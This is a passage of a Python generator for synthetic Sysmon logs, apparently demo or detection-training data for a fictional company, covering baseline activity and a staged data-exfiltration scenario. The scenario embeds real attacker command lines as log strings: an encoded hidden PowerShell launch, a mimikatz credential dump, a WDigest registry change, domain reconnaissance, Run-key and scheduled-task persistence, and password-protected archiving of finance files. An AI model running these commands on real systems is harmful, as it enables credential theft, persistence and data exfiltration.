        f"ProcessGuid: {_generate_guid()}",
        f"ProcessId: {random.randint(1000, 65000)}",
        f"Image: {image}",
        f"User: {user}",
        f"Protocol: {protocol}",
        f"Initiated: true",
        f"SourceIsIpv6: false",
        f"SourceIp: {src_ip}",
        f"SourceHostname: {computer}",
        f"SourcePort: {src_port}",
        f"SourcePortName: ",
        f"SourceMAC: {src_mac}",
        f"DestinationIsIpv6: false",
        f"DestinationIp: {dst_ip}",
        f"DestinationHostname: {dst_hostname}",
        f"DestinationPort: {dst_port}",
        f"DestinationPortName: {_port_name(dst_port)}",
        f"DestinationMAC: {dst_mac}",
    ]
    return _wrap_kv_event(header, MESSAGE_LABELS[3], msg_lines, demo_id)


def sysmon_eid11(ts: datetime, computer: str, user: str, image: str,
                 target_filename: str, demo_id: str = None) -> str:
    """EID 11 - File Create."""
    header = _kv_header(11, computer, ts)
    utc_time = ts.strftime("%Y-%m-%d %H:%M:%S") + f".{random.randint(100, 999)}"

    msg_lines = [
        f"RuleName: -",
        f"UtcTime: {utc_time}",
        f"ProcessGuid: {_generate_guid()}",
        f"ProcessId: {random.randint(1000, 65000)}",
        f"Image: {image}",
        f"TargetFilename: {target_filename}",
        f"CreationUtcTime: {utc_time}",
        f"User: {user}",
        f"Hashes: {_generate_hashes(target_filename)}",
    ]
    return _wrap_kv_event(header, MESSAGE_LABELS[11], msg_lines, demo_id)


def sysmon_eid13(ts: datetime, computer: str, user: str, image: str,
                 event_type: str, target_object: str, details: str,
                 demo_id: str = None) -> str:
    """EID 13 - Registry Value Set."""
    header = _kv_header(13, computer, ts)
    utc_time = ts.strftime("%Y-%m-%d %H:%M:%S") + f".{random.randint(100, 999)}"

    msg_lines = [
        f"RuleName: -",
        f"EventType: {event_type}",
        f"UtcTime: {utc_time}",
        f"ProcessGuid: {_generate_guid()}",
        f"ProcessId: {random.randint(1000, 65000)}",
        f"Image: {image}",
        f"TargetObject: {target_object}",
        f"Details: {details}",
        f"User: {user}",
    ]
    return _wrap_kv_event(header, MESSAGE_LABELS[13], msg_lines, demo_id)


def sysmon_eid22(ts: datetime, computer: str, user: str, image: str,
                 query_name: str, query_status: str = "0",
                 query_results: str = "", demo_id: str = None) -> str:
    """EID 22 - DNS Query."""
    header = _kv_header(22, computer, ts)
    utc_time = ts.strftime("%Y-%m-%d %H:%M:%S") + f".{random.randint(100, 999)}"

    msg_lines = [
        f"RuleName: -",
        f"UtcTime: {utc_time}",
        f"ProcessGuid: {_generate_guid()}",
        f"ProcessId: {random.randint(1000, 65000)}",
        f"QueryName: {query_name}",
        f"QueryStatus: {query_status}",
        f"QueryResults: {query_results if query_results else '::ffff:0.0.0.0;'}",
        f"Image: {image}",
        f"User: {user}",
    ]
    return _wrap_kv_event(header, MESSAGE_LABELS[22], msg_lines, demo_id)


def sysmon_eid5(ts: datetime, computer: str, user: str, image: str,
                demo_id: str = None) -> str:
    """EID 5 - Process Terminated."""
    header = _kv_header(5, computer, ts)
    utc_time = ts.strftime("%Y-%m-%d %H:%M:%S") + f".{random.randint(100, 999)}"

    msg_lines = [
        f"RuleName: -",
        f"UtcTime: {utc_time}",
        f"ProcessGuid: {_generate_guid()}",
        f"ProcessId: {random.randint(1000, 65000)}",
        f"Image: {image}",
        f"User: {user}",
    ]
    return _wrap_kv_event(header, MESSAGE_LABELS[5], msg_lines, demo_id)


def sysmon_eid7(ts: datetime, computer: str, user: str, image: str,
                image_loaded: str, demo_id: str = None) -> str:
    """EID 7 - Image Loaded (DLL)."""
    header = _kv_header(7, computer, ts)
    utc_time = ts.strftime("%Y-%m-%d %H:%M:%S") + f".{random.randint(100, 999)}"

    dll_name = image_loaded.rsplit("\\", 1)[-1] if "\\" in image_loaded else image_loaded
    signed = "true" if "Windows" in image_loaded or "Microsoft" in image_loaded else "false"
    signer = "Microsoft Windows" if signed == "true" else "-"

    msg_lines = [
        f"RuleName: -",
        f"UtcTime: {utc_time}",
        f"ProcessGuid: {_generate_guid()}",
        f"ProcessId: {random.randint(1000, 65000)}",
        f"Image: {image}",
        f"ImageLoaded: {image_loaded}",
        f"FileVersion: 10.0.19041.1 (WinBuild.160101.0800)",
        f"Description: {dll_name}",
        f"Product: Microsoft Windows Operating System",
        f"Company: Microsoft Corporation",
        f"OriginalFileName: {dll_name}",
        f"Hashes: {_generate_hashes(image_loaded)}",
        f"Signed: {signed}",
        f"Signature: {signer}",
        f"SignatureStatus: Valid",
        f"User: {user}",
    ]
    return _wrap_kv_event(header, MESSAGE_LABELS[7], msg_lines, demo_id)


def sysmon_eid8(ts: datetime, computer: str, source_user: str,
                source_image: str, source_pid: int,
                target_image: str, target_pid: int,
                demo_id: str = None) -> str:
    """EID 8 - CreateRemoteThread.

    Very rare in baseline (legitimate: AV scanning, debugging, .NET CLR).
    Primarily appears in attack scenarios (process injection).
    """
    header = _kv_header(8, computer, ts)
    utc_time = ts.strftime("%Y-%m-%d %H:%M:%S") + f".{random.randint(100, 999)}"

    msg_lines = [
        f"RuleName: -",
        f"UtcTime: {utc_time}",
        f"SourceProcessGuid: {_generate_guid()}",
        f"SourceProcessId: {source_pid}",
        f"SourceImage: {source_image}",
        f"TargetProcessGuid: {_generate_guid()}",
        f"TargetProcessId: {target_pid}",
        f"TargetImage: {target_image}",
        f"NewThreadId: {random.randint(1000, 30000)}",
        f"StartAddress: 0x{random.randint(0x7FF600000000, 0x7FF6FFFFFFFF):016X}",
        f"StartModule: -",
        f"StartFunction: -",
        f"SourceUser: {source_user}",
        f"TargetUser: NT AUTHORITY\\SYSTEM",
    ]
    return _wrap_kv_event(header, MESSAGE_LABELS[8], msg_lines, demo_id)


def sysmon_eid10(ts: datetime, computer: str, source_user: str,
                 source_image: str, target_image: str,
                 granted_access: str, call_trace: str = "",
                 demo_id: str = None) -> str:
    """EID 10 - ProcessAccess.

    Key for detecting LSASS credential dumping. Baseline shows legitimate
    access from svchost.exe, csrss.exe, wininit.exe.
    """
    header = _kv_header(10, computer, ts)
    utc_time = ts.strftime("%Y-%m-%d %H:%M:%S") + f".{random.randint(100, 999)}"

    if not call_trace:
        call_trace = "C:\\Windows\\SYSTEM32\\ntdll.dll+9D4C4|C:\\Windows\\System32\\KERNELBASE.dll+2B3ED"

    msg_lines = [
        f"RuleName: -",
        f"UtcTime: {utc_time}",
        f"SourceProcessGUID: {_generate_guid()}",
        f"SourceProcessId: {random.randint(1000, 65000)}",
        f"SourceThreadId: {random.randint(1000, 30000)}",
        f"SourceImage: {source_image}",
        f"TargetProcessGUID: {_generate_guid()}",
        f"TargetProcessId: {random.randint(500, 5000)}",
        f"TargetImage: {target_image}",
        f"GrantedAccess: {granted_access}",
        f"CallTrace: {call_trace}",
        f"SourceUser: {source_user}",
        f"TargetUser: NT AUTHORITY\\SYSTEM",
    ]
    return _wrap_kv_event(header, MESSAGE_LABELS[10], msg_lines, demo_id)


def _port_name(port: int) -> str:
    """Map common port numbers to service names."""
    names = {
        53: "dns", 80: "http", 88: "kerberos", 135: "epmap",
        389: "ldap", 443: "https", 445: "microsoft-ds",
        636: "ldaps", 1433: "ms-sql-s", 3389: "ms-wbt-server",
    }
    return names.get(port, "")


# =============================================================================
# BASELINE: SERVER EVENTS
# =============================================================================

def _pick_eid(weights: Dict[int, int]) -> int:
    """Pick a random Event ID based on weights."""
    choices = list(weights.keys())
    w = list(weights.values())
    return random.choices(choices, weights=w, k=1)[0]


def _generate_server_event(ts: datetime, server_name: str, server_info: dict) -> str:
    """Generate a single baseline event for a server."""
    eid = _pick_eid(SERVER_EID_WEIGHTS)
    role = server_info["role"]
    server_ip = server_info["ip"]
    computer = server_name

    # Get a process for this server role
    role_procs = SERVER_PROCESSES.get(role, []) + COMMON_SERVER_PROCESSES
    proc = random.choice(role_procs)
    image = proc["image"]
    image_name = proc["name"]
    user = SYSTEM_USER if proc["system"] else f"{DOMAIN_PREFIX}\\svc_admin"

    if eid == 1:
        # Process Create
        cmd_lines = {
            "svchost.exe": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
            "lsass.exe": "C:\\Windows\\System32\\lsass.exe",
            "dfsr.exe": "C:\\Windows\\System32\\dfsr.exe",
            "gpupdate.exe": "gpupdate /force",
            "dns.exe": "C:\\Windows\\System32\\dns.exe",
            "sqlservr.exe": '"C:\\Program Files\\Microsoft SQL Server\\MSSQL16.MSSQLSERVER\\MSSQL\\Binn\\sqlservr.exe" -sSQLSERVER',
            "SQLAGENT.EXE": '"C:\\Program Files\\Microsoft SQL Server\\MSSQL16.MSSQLSERVER\\MSSQL\\Binn\\SQLAGENT.EXE" -i MSSQLSERVER',
            "w3wp.exe": "C:\\Windows\\System32\\inetsrv\\w3wp.exe -ap \"DefaultAppPool\"",
            "MpCmdRun.exe": '"C:\\Program Files\\Windows Defender\\MpCmdRun.exe" -Scan -ScanType 1',
            "WmiPrvSE.exe": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe -Embedding",
            "taskhostw.exe": "taskhostw.exe",
            "wuauclt.exe": "wuauclt.exe /RunHandlerComServer",
        }
        cmd = cmd_lines.get(image_name, image)
        return sysmon_eid1(ts, computer, user, image, cmd)

    elif eid == 3:
        # Network Connection
        target = random.choice(SERVER_NETWORK_TARGETS)
        src_port = random.randint(49152, 65535)
        return sysmon_eid3(ts, computer, user, image, target["protocol"],
                           server_ip, src_port, target["dst_ip"], target["dst_port"])

    elif eid == 11:
        # File Create
        template = random.choice(SERVER_FILE_TARGETS)
        filename = template.replace("{rand}", f"{random.randint(10000, 99999):05X}")
        filename = filename.replace("{date}", ts.strftime("%y%m%d"))
        return sysmon_eid11(ts, computer, user, image, filename)

    elif eid == 13:
        # Registry Value Set
        reg_path = random.choice(SERVER_REGISTRY_PATHS)
        return sysmon_eid13(ts, computer, user, image, "SetValue", reg_path,
                            f"DWORD (0x{random.randint(0, 0xFF):08x})")

    elif eid == 5:
        # Process Terminated — mirrors process create
        return sysmon_eid5(ts, computer, user, image)

    elif eid == 7:
        # Image Loaded (DLL) — common system DLLs loaded by server processes
        dll = random.choice(SERVER_DLLS)
        return sysmon_eid7(ts, computer, user, image, dll)

    elif eid == 8:
        # CreateRemoteThread — very rare in baseline (AV/monitoring only)
        # Only legitimate source: Windows Defender scanning a service
        source_image = "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe"
        target_image = random.choice([
            "C:\\Windows\\System32\\svchost.exe",
            "C:\\Windows\\System32\\lsass.exe",
        ])
        return sysmon_eid8(ts, computer, SYSTEM_USER, source_image,
                           random.randint(1000, 5000), target_image,
                           random.randint(500, 5000))

    elif eid == 10:
        # ProcessAccess — legitimate access to system processes
        target = random.choice(PROCESS_ACCESS_TARGETS_SERVER)
        # lsass access only from svchost or wininit (legitimate)
        if target == LSASS_PATH:
            source_image = random.choice([
                "C:\\Windows\\System32\\svchost.exe",
                "C:\\Windows\\System32\\wininit.exe",
            ])
            access_mask = "0x1000"  # QUERY_LIMITED_INFORMATION
        else:
            source_image = image
            access_mask, _ = random.choice(PROCESS_ACCESS_MASKS[:3])  # never ALL_ACCESS baseline
        return sysmon_eid10(ts, computer, SYSTEM_USER, source_image,
                            target, access_mask)

    elif eid == 22:
        # DNS Query
        query = random.choice(DNS_INTERNAL + DNS_EXTERNAL)
        # Resolve to a plausible IP
        if "theFakeTshirtCompany.com" in query:
            result = f"::ffff:{server_ip};"
        else:
            result = f"::ffff:{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)};"
        dns_image = "C:\\Windows\\System32\\svchost.exe"
        return sysmon_eid22(ts, computer, SYSTEM_USER, dns_image, query,
                            query_results=result)

    return ""


def generate_baseline_server_hour(base_date: str, day: int, hour: int,
                                  server_name: str, server_info: dict,
                                  count: int) -> List[str]:
    """Generate baseline events for one server for one hour."""
    events = []
    base_dt = date_add(base_date, day).replace(hour=hour)

    for _ in range(count):
        minute = random.randint(0, 59)
        second = random.randint(0, 59)
        micro = random.randint(0, 999999)
        ts = base_dt.replace(minute=minute, second=second, microsecond=micro)
        event = _generate_server_event(ts, server_name, server_info)
        if event:
            events.append(event)

    return events


# =============================================================================
# BASELINE: WORKSTATION EVENTS
# =============================================================================

def select_sampled_workstations(day: int, count: int = 20) -> list:
    """Select N workstations for a given day using deterministic seed."""
    rng = random.Random(day * 31337)
    # Get all users with Windows workstations (exclude servers)
    all_users = [u for u in USERS.values() if u.device_name and not u.device_name.startswith(("DC-", "FILE-", "SQL-", "APP-", "BACKUP-", "WEB-", "MON-", "DEV-"))]
    return rng.sample(all_users, min(count, len(all_users)))


def _generate_workstation_event(ts: datetime, user_obj) -> str:
    """Generate a single baseline event for a workstation."""
    eid = _pick_eid(WORKSTATION_EID_WEIGHTS)
    computer = user_obj.device_name
    user_str = f"{DOMAIN_PREFIX}\\{user_obj.username}"
    user_ip = user_obj.ip_address

    proc = random.choice(WORKSTATION_PROCESSES)
    image = proc["image"]
    image_name = proc["name"]

    if eid == 1:
        # Process Create
        cmd_lines = {
            "WINWORD.EXE": f'"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\{user_obj.username}\\Documents\\report.docx"',
            "EXCEL.EXE": f'"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" "C:\\Users\\{user_obj.username}\\Documents\\budget.xlsx"',
            "OUTLOOK.EXE": '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"',
            "msedge.exe": '"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --no-startup-window',
            "chrome.exe": '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --no-first-run',
            "Teams.exe": '"C:\\Program Files\\WindowsApps\\Microsoft.Teams_24.1.100\\ms-teams.exe" --system-initiated',
            "explorer.exe": "C:\\Windows\\explorer.exe",
            "notepad.exe": "C:\\Windows\\System32\\notepad.exe",
        }
        cmd = cmd_lines.get(image_name, image)
        return sysmon_eid1(ts, computer, user_str, image, cmd)

    elif eid == 3:
        # Network Connection
        target = random.choice(WORKSTATION_NETWORK_TARGETS)
        src_port = random.randint(49152, 65535)
        return sysmon_eid3(ts, computer, user_str, image, target["protocol"],
                           user_ip, src_port, target["dst_ip"], target["dst_port"])

    elif eid == 11:
        # File Create
        template = random.choice(WORKSTATION_FILE_TARGETS)
        filename = template.replace("{user}", user_obj.username)
        filename = filename.replace("{rand}", f"{random.randint(10000, 99999):05X}")
        return sysmon_eid11(ts, computer, user_str, image, filename)

    elif eid == 13:
        # Registry Value Set
        reg_path = random.choice(WORKSTATION_REGISTRY_PATHS)
        return sysmon_eid13(ts, computer, user_str, image, "SetValue", reg_path,
                            f"DWORD (0x{random.randint(0, 0xFF):08x})")

    elif eid == 5:
        # Process Terminated
        return sysmon_eid5(ts, computer, user_str, image)

    elif eid == 7:
        # Image Loaded (DLL)
        dll = random.choice(WORKSTATION_DLLS)
        return sysmon_eid7(ts, computer, user_str, image, dll)

    elif eid == 10:
        # ProcessAccess — workstation processes accessing system processes
        target = random.choice(PROCESS_ACCESS_TARGETS_WS)
        access_mask, _ = random.choice(PROCESS_ACCESS_MASKS[:2])  # limited access only
        return sysmon_eid10(ts, computer, user_str, image, target, access_mask)

    elif eid == 22:
        # DNS Query
        query = random.choice(DNS_EXTERNAL + DNS_INTERNAL[:2])
        dns_image = "C:\\Windows\\System32\\svchost.exe"
        result = f"::ffff:{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)};"
        return sysmon_eid22(ts, computer, user_str, dns_image, query,
                            query_results=result)

    return ""


def generate_baseline_workstation_hour(base_date: str, day: int, hour: int,
                                       user_obj, count: int) -> List[str]:
    """Generate baseline events for one workstation for one hour."""
    events = []
    base_dt = date_add(base_date, day).replace(hour=hour)

    for _ in range(count):
        minute = random.randint(0, 59)
        second = random.randint(0, 59)
        micro = random.randint(0, 999999)
        ts = base_dt.replace(minute=minute, second=second, microsecond=micro)
        event = _generate_workstation_event(ts, user_obj)
        if event:
            events.append(event)

    return events


# =============================================================================
# CLIENT WORKSTATION EVENTS (configurable via --clients)
# =============================================================================
# When num_clients > 0, these replace the legacy 20-workstation sampling.
# Each client generates profile-driven Sysmon events with correlated
# process trees, network connections, DNS queries, file creates, and DLLs.

def _pick_app_profile() -> dict:
    """Pick a random application profile weighted by frequency."""
    return random.choices(CLIENT_APP_PROFILES, weights=_PROFILE_WEIGHTS, k=1)[0]


def _resolve_template(template: str, username: str) -> str:
    """Replace {user} and {rand} placeholders in file/cmd templates."""
    result = template.replace("{user}", username)
    result = result.replace("{rand}", f"{random.randint(10000, 99999):05X}")
    return result


def _client_process_create(ts: datetime, client, profile: dict) -> List[str]:
    """EID 1 -- Process creation from app profile.

    Creates the main process and optionally a child process (30% chance
    for profiles with children defined).
    """
    events = []
    computer = client.device_name
    user_str = f"{DOMAIN_PREFIX}\\{client.username}"
    proc = profile["proc"]

    cmd = _resolve_template(proc["cmd"], client.username)
    events.append(sysmon_eid1(ts, computer, user_str, proc["image"], cmd))

    # Child process (30% chance if profile has children)
    if proc.get("children") and random.random() < 0.30:
        child = random.choice(proc["children"])
        child_ts = ts.replace(second=min(59, ts.second + random.randint(1, 3)),
                              microsecond=random.randint(0, 999999))
        child_cmd = _resolve_template(child["cmd"], client.username)
        events.append(sysmon_eid1(
            child_ts, computer, user_str, child["image"], child_cmd,
            parent_image=proc["image"], parent_command_line=cmd
        ))

    return events


def _client_network_connect(ts: datetime, client, profile: dict) -> List[str]:
    """EID 3 -- Network connection from app profile targets."""
    events = []
    if not profile["network"]:
        return events

    computer = client.device_name
    user_str = f"{DOMAIN_PREFIX}\\{client.username}"
    proc = profile["proc"]
    target = random.choice(profile["network"])
    src_port = random.randint(49152, 65535)

    events.append(sysmon_eid3(
        ts, computer, user_str, proc["image"], target["protocol"],
        client.ip_address, src_port, target["dst_ip"], target["dst_port"]
    ))
    return events


def _client_process_terminate(ts: datetime, client, profile: dict) -> List[str]:
    """EID 5 -- Process termination matching profile app."""
    computer = client.device_name
    user_str = f"{DOMAIN_PREFIX}\\{client.username}"
    return [sysmon_eid5(ts, computer, user_str, profile["proc"]["image"])]


def _client_image_loaded(ts: datetime, client, profile: dict) -> List[str]:
    """EID 7 -- DLL load from profile-specific and common DLLs."""
    events = []
    computer = client.device_name
    user_str = f"{DOMAIN_PREFIX}\\{client.username}"
    proc = profile["proc"]

    # Use profile-specific DLLs if available, fallback to common workstation DLLs
    dll_pool = profile.get("dlls", []) + WORKSTATION_DLLS[:4]
    dll = random.choice(dll_pool)
    events.append(sysmon_eid7(ts, computer, user_str, proc["image"], dll))
    return events


def _client_file_create(ts: datetime, client, profile: dict) -> List[str]:
    """EID 11 -- File creation from profile activity (cache, temp, docs)."""
    events = []
    computer = client.device_name
    user_str = f"{DOMAIN_PREFIX}\\{client.username}"
    proc = profile["proc"]

    # Use profile-specific files if available, fallback to generic temp
    file_pool = profile.get("files", [])
    if not file_pool:
        file_pool = WORKSTATION_FILE_TARGETS
    template = random.choice(file_pool)
    filename = _resolve_template(template, client.username)
    events.append(sysmon_eid11(ts, computer, user_str, proc["image"], filename))
    return events


def _client_registry_set(ts: datetime, client) -> List[str]:
    """EID 13 -- Registry value set from app settings and user preferences."""
    events = []
    computer = client.device_name
    user_str = f"{DOMAIN_PREFIX}\\{client.username}"

    reg_path = random.choice(WORKSTATION_REGISTRY_PATHS)
    # Pick a plausible process for registry writes
    reg_proc = random.choice([
        "C:\\Windows\\System32\\svchost.exe",
        "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
        "C:\\Windows\\explorer.exe",
    ])
    events.append(sysmon_eid13(
        ts, computer, user_str, reg_proc, "SetValue", reg_path,
        f"DWORD (0x{random.randint(0, 0xFF):08x})"
    ))
    return events


def _client_dns_query(ts: datetime, client, profile: dict) -> List[str]:
    """EID 22 -- DNS queries matching profile domains."""
    events = []
    computer = client.device_name
    user_str = f"{DOMAIN_PREFIX}\\{client.username}"

    # Use profile-specific DNS if available, fallback to common external DNS
    dns_pool = profile.get("dns", [])
    if not dns_pool:
        dns_pool = DNS_EXTERNAL
    query = random.choice(dns_pool)
    result = f"::ffff:{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)};"
    dns_image = "C:\\Windows\\System32\\svchost.exe"
    events.append(sysmon_eid22(ts, computer, user_str, dns_image, query,
                               query_results=result))
    return events


def generate_client_sysmon_hour(base_date: str, day: int, hour: int,
                                client, scale: float) -> List[str]:
    """Generate all Sysmon events for one client workstation for one hour.

    Work-hour gating: 7-18 weekdays, minimal off-hours/weekend.
    Each event picks a weighted app profile and generates a correlated
    cluster of events matching that application.

    Volume target: ~20-30 events/client/day (lower than WinEventLog).
    """
    events = []
    dt = date_add(base_date, day)
    is_weekend = dt.weekday() >= 5

    # Work-hour gating
    if hour < 7 or hour > 18:
        return events
    if is_weekend and random.random() > 0.10:
        return events

    # Calculate events for this hour using natural volume curves
    count = calc_natural_events(
        int(CLIENT_SYSMON_EVENTS_PER_HOUR * scale),
        base_date, day, hour, "windows"
    )

    base_dt = dt.replace(hour=hour)

    for _ in range(count):
        minute = random.randint(0, 59)
        second = random.randint(0, 59)
        micro = random.randint(0, 999999)
        ts = base_dt.replace(minute=minute, second=second, microsecond=micro)

        # Pick app profile and EID
        profile = _pick_app_profile()
        eid = _pick_eid(CLIENT_EID_WEIGHTS)

        if eid == 1:
            events.extend(_client_process_create(ts, client, profile))
        elif eid == 3:
            events.extend(_client_network_connect(ts, client, profile))
        elif eid == 5:
            events.extend(_client_process_terminate(ts, client, profile))
        elif eid == 7:
            events.extend(_client_image_loaded(ts, client, profile))
        elif eid == 11:
            events.extend(_client_file_create(ts, client, profile))
        elif eid == 13:
            events.extend(_client_registry_set(ts, client))
        elif eid == 22:
            events.extend(_client_dns_query(ts, client, profile))

    return events


# =============================================================================
# SCENARIO: EXFIL (Day 4-13)
# =============================================================================

def generate_exfil_events(base_date: str, day: int, hour: int) -> List[str]:
    """Generate exfil scenario Sysmon events for a specific day/hour."""
    events = []

    # Phase mapping
    # Day 4: Initial Access (jessica.brown, ATL)
    # Day 5-7: Lateral Movement (ATL → BOS)
    # Day 8-10: Persistence (alex.miller, BOS)
    # Day 11-13: Exfiltration (alex.miller, BOS)

    jessica_computer = JESSICA_WS_HOSTNAME  # ATL-WS-JBROWN01
    jessica_ip = JESSICA_WS_IP              # 10.20.30.15
    jessica_user = f"{DOMAIN_PREFIX}\\{LATERAL_USER}"

    alex_computer = COMP_WS_HOSTNAME        # BOS-WS-AMILLER01
    alex_ip = COMP_WS_IP                    # 10.10.30.55
    alex_user = f"{DOMAIN_PREFIX}\\{COMP_USER}"

    demo_id = "exfil"

    # =========================================================================
    # Day 4: Initial Access
    # =========================================================================
    if day == 4:
        if hour == 10:
            # 10:15 - DNS resolve phishing domain
            ts = date_add(base_date, day).replace(hour=10, minute=15, second=23)
            events.append(sysmon_eid22(ts, jessica_computer, jessica_user,
                                       "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                                       "rnicrosoft-security.com",
                                       query_results=f"::ffff:{THREAT_IP};",
                                       demo_id=demo_id))

            # 10:15 - DNS resolve C2 staging
            ts = ts.replace(second=35)
            events.append(sysmon_eid22(ts, jessica_computer, jessica_user,
                                       "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                                       "cdn-rnicrosoft.com",
                                       query_results=f"::ffff:{THREAT_IP};",
                                       demo_id=demo_id))

            # 10:16 - Network connection to threat IP
            ts = ts.replace(minute=16, second=2)
            events.append(sysmon_eid3(ts, jessica_computer, jessica_user,
                                      "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                                      "tcp", jessica_ip, random.randint(49152, 65535),
                                      THREAT_IP, 443, demo_id=demo_id))

        if hour == 10:
            # 10:22 - PowerShell execution (post-credential theft)
            ts = date_add(base_date, day).replace(hour=10, minute=22, second=45)
            events.append(sysmon_eid1(ts, jessica_computer, jessica_user,
                                      "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                      "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA==",
                                      demo_id=demo_id))

            # 10:23 - File dropped: update.ps1
            ts = ts.replace(minute=23, second=5)
            events.append(sysmon_eid11(ts, jessica_computer, jessica_user,
                                       "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                       "C:\\Users\\jbrown\\AppData\\Local\\Temp\\update.ps1",
                                       demo_id=demo_id))

            # 10:23 - C2 callback
            ts = ts.replace(second=30)
            events.append(sysmon_eid3(ts, jessica_computer, jessica_user,
                                      "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                      "tcp", jessica_ip, random.randint(49152, 65535),
                                      THREAT_IP, 443, demo_id=demo_id))

    # =========================================================================
    # Day 5-7: Lateral Movement
    # =========================================================================
    if day == 5 and hour == 11:
        # Network reconnaissance
        ts = date_add(base_date, day).replace(hour=11, minute=15, second=10)
        events.append(sysmon_eid1(ts, jessica_computer, jessica_user,
                                  "C:\\Windows\\System32\\cmd.exe",
                                  "cmd.exe /c net view /domain",
                                  demo_id=demo_id))

        ts = ts.replace(minute=16, second=5)
        events.append(sysmon_eid1(ts, jessica_computer, jessica_user,
                                  "C:\\Windows\\System32\\cmd.exe",
                                  "cmd.exe /c net group \"Domain Admins\" /domain",
                                  demo_id=demo_id))

        # DNS lookup for DC
        ts = ts.replace(minute=17, second=22)
        events.append(sysmon_eid22(ts, jessica_computer, jessica_user,
                                   "C:\\Windows\\System32\\cmd.exe",
                                   "dc-bos-01.theFakeTshirtCompany.com",
                                   query_results="::ffff:10.10.20.10;",
                                   demo_id=demo_id))

    if day == 6 and hour == 14:
        # Credential dumping with mimikatz
        ts = date_add(base_date, day).replace(hour=14, minute=30, second=15)
        events.append(sysmon_eid1(ts, jessica_computer, jessica_user,
                                  "C:\\Users\\jbrown\\AppData\\Local\\Temp\\mimikatz.exe",
                                  "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
                                  parent_image="C:\\Windows\\System32\\cmd.exe",
                                  demo_id=demo_id))

        # WDigest credential caching enabled
        ts = ts.replace(minute=31, second=2)
        events.append(sysmon_eid13(ts, jessica_computer, jessica_user,
                                   "C:\\Users\\jbrown\\AppData\\Local\\Temp\\mimikatz.exe",
                                   "SetValue",
                                   "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential",
                                   "DWORD (0x00000001)",
                                   demo_id=demo_id))

        # SMB lateral to DC
        ts = ts.replace(minute=35, second=42)
        events.append(sysmon_eid3(ts, jessica_computer, jessica_user,
                                  "C:\\Windows\\System32\\cmd.exe",
                                  "tcp", jessica_ip, random.randint(49152, 65535),
                                  "10.10.20.10", 445, demo_id=demo_id))

        # SMB lateral to file server
        ts = ts.replace(minute=36, second=18)
        events.append(sysmon_eid3(ts, jessica_computer, jessica_user,
                                  "C:\\Windows\\System32\\cmd.exe",
                                  "tcp", jessica_ip, random.randint(49152, 65535),
                                  "10.10.20.20", 445, demo_id=demo_id))

    if day == 7 and hour == 9:
        # Lateral movement arrives at alex.miller workstation (BOS)
        ts = date_add(base_date, day).replace(hour=9, minute=45, second=30)
        events.append(sysmon_eid1(ts, alex_computer, alex_user,
                                  "C:\\Windows\\System32\\cmd.exe",
                                  "cmd.exe /c whoami /all",
                                  demo_id=demo_id))

        ts = ts.replace(minute=46, second=15)
        events.append(sysmon_eid1(ts, alex_computer, alex_user,
                                  "C:\\Windows\\System32\\cmd.exe",
                                  "cmd.exe /c net use \\\\FILE-BOS-01\\finance$",
                                  demo_id=demo_id))

    # =========================================================================
    # Day 8-10: Persistence
    # =========================================================================
    if day == 8 and hour == 2:
        # Registry persistence - Run key
        ts = date_add(base_date, day).replace(hour=2, minute=15, second=30)
        events.append(sysmon_eid13(ts, alex_computer, alex_user,
                                   "C:\\Windows\\System32\\reg.exe",
                                   "SetValue",
                                   "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsHealthCheck",
                                   "C:\\ProgramData\\svchost.exe",
                                   demo_id=demo_id))

        # Backdoor dropped
        ts = ts.replace(minute=15, second=45)
        events.append(sysmon_eid11(ts, alex_computer, alex_user,
                                   "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                   "C:\\ProgramData\\svchost.exe",
                                   demo_id=demo_id))

        # Scheduled task for persistence
        ts = ts.replace(minute=16, second=10)
        events.append(sysmon_eid1(ts, alex_computer, alex_user,
                                  "C:\\Windows\\System32\\schtasks.exe",
                                  'schtasks /create /tn "WindowsHealthCheck" /tr "C:\\ProgramData\\svchost.exe" /sc onlogon /ru SYSTEM',
                                  demo_id=demo_id))

    if day == 9 and hour == 14:
        # 7z compression for data staging
        ts = date_add(base_date, day).replace(hour=14, minute=10, second=5)
        events.append(sysmon_eid1(ts, alex_computer, alex_user,
                                  "C:\\Users\\amiller\\AppData\\Local\\Temp\\7z.exe",
                                  '7z.exe a -pS3cur3P@ss data_batch_1.zip "C:\\Users\\amiller\\Documents\\Finance\\*"',
                                  parent_image="C:\\Windows\\System32\\cmd.exe",
                                  demo_id=demo_id))

        # Data staged to file server
        ts = ts.replace(minute=12, second=30)
        events.append(sysmon_eid3(ts, alex_computer, alex_user,
                                  "C:\\Windows\\System32\\cmd.exe",
